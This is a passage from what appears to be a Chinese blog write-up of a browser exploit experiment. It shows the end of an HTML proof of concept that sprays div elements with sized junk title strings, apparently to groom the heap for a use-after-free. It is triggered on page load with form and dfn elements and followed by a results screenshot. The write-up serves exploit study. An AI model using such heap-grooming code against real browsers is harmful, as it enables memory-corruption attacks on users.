               arr_div[i]= document.createElement(<span class="hljs-string">"div"</span>);
               arr_div[i].title= junk.substring(<span class="hljs-number">0</span>,(<span class="hljs-number">0x58</span>-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);
          }

     }

     &lt;<span class="hljs-regexp">/script&gt;
&lt;/head</span>&gt;
&lt;body onload=<span class="hljs-string">"helloWorld()"</span>&gt;
     &lt;form id=<span class="hljs-string">"a"</span>&gt;
     &lt;<span class="hljs-regexp">/form&gt;
     &lt;dfn id="b"&gt;
     &lt;/dfn</span>&gt;
&lt;<span class="hljs-regexp">/body&gt;
&lt;/html</span>&gt;</code></pre>
<h1 id="0x05-实验结果">0x05 实验结果</h1>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170707164049179?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p></div>